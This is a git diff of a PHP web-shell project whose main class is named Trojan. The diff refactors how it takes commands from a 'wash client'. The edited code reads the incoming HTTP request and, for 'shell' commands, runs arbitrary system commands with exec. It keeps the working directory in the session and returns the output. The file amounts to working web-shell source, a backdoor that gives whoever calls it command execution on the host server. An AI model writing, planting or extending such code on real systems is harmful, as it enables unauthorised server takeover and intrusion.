@@ -3,11 +3,9 @@
 class Payload{
     public $description = 'A description of the payload goes here.';
     public $options = array();
-
     public function execute(){
         return 'hacked';
     }
-
 }
 
 // @todo: probably need to track some kind of options hash over here
@@ -33,7 +31,25 @@ class Trojan{
      */
     public function __construct(){
         # Require that $this->cwd always contains a meaningful value
-        $this->cwd = `pwd`;
+        $this->cwd = trim(`pwd`);
+    }
+
+    /**
+     * Processes commands sent from the wash client
+     *
+     * @param string $json             JSON from the wash client
+     */
+    public function process_command($json){
+        # @todo (probably here: decrypt the command)
+        # process shell commands
+        if($json['type'] == 'shell'){
+            $this->process_shell_command($json['cmd']);
+        }
+
+        # process wash commands
+        if($json['type'] == 'wash'){
+            $this->process_wash_command($json['cmd']);
+        }
     }
 
     /**
@@ -41,7 +57,7 @@ class Trojan{
      *
      * @param string $command          A command - this will change
      */
-    public function process_command($command){
+    private function process_shell_command($command){
         # emulate cwd persistence
         if(isset($_SESSION['cwd'])){ $this->cwd = $_SESSION['cwd']; }
 
@@ -55,9 +71,9 @@ class Trojan{
 
         # optionally (by default) redirect stderr to stdout
         if($this->options['redirect_stderr_to_stdout']){
-            $command  = "cd {$this->cwd}; " . $_REQUEST['shell'] . " 2>&1; pwd";
+            $command  = "cd {$this->cwd}; $command 2>&1; pwd";
         } else {
-            $command  = "cd {$this->cwd}; " . $_REQUEST['shell'] . "; pwd";
+            $command  = "cd {$this->cwd}; $command; pwd";
         }
         exec($command, $this->output_raw);
 
@@ -67,6 +83,15 @@ class Trojan{
 
         # save the cwd
         $_SESSION['cwd'] = $this->cwd;
+    }
+
+    /**
+     * Processes a wash command
+     *
+     * @param string $command          The wash command to process
+     */
+    private function process_wash_command($command){
+        return true;
     }
 
     /**
@@ -108,5 +133,5 @@ class Trojan{
 /* ---------- Procedural code starts here ---------- */
 session_start();
 $trojan = new Trojan();
-$trojan->process_command($_REQUEST['shell']);
+$trojan->process_command($_REQUEST);
 $trojan->send_response();
